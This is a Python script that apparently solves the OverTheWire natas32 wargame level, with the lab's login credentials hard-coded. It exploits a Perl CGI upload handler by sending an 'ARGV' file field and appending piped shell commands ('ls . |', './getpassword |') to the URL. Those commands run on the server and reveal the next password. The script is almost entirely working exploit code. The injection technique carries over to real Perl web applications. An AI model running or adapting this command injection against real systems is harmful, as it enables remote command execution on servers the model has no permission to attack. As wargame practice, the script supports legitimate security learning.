import requests
from urllib.parse import quote

baseurl = "http://natas32.natas.labs.overthewire.org/index.pl?"
creds = ("natas32","NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B")

url = baseurl + "ls%20.%20|"         # ls does not work, we need to run "ls ."


print(url)

session = requests.Session()
session.auth = creds


files = [
    ("file",(None,"ARGV")),
    ("file",("file.csv","alice,bob,charlie,dick,eve")),
    ("submit",(None,"Upload"))
]

response = session.post(url, files = files)

print(response.text)

# getpassword is the required binary 


url = baseurl + "./getpassword%20|"

response = session.post(url, files = files)

print(response.text)